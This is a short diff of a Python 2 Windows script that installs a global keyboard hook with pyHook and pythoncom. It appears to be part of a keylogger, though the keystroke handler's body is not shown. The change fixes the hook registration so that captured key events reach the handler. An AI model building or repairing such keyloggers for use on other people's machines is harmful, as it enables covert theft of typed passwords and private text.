@@ -2,7 +2,7 @@ from ctypes import *
 import pythoncom
 import pyHook
 import win32clipboard
-import win32api
+
 
 
 
@@ -92,13 +92,9 @@ def KeyStroke(event):
 
 
 def run():
-    print "\n 0000000"
-    while True :
-        kl = pyHook.HookManager()
-        kl.KeyDown = KeyStroke()
-        kl.HookKeyboard()
-        pythoncom.PumpMessages()
-    
-    print("key over")
-    sys.exit(0)
-    return 0
+    kl = pyHook.HookManager()
+    kl.KeyDown = KeyStroke
+    print kl.KeyDown
+    # register the hook and execute forever
+    kl.HookKeyboard()
+    pythoncom.PumpMessages()
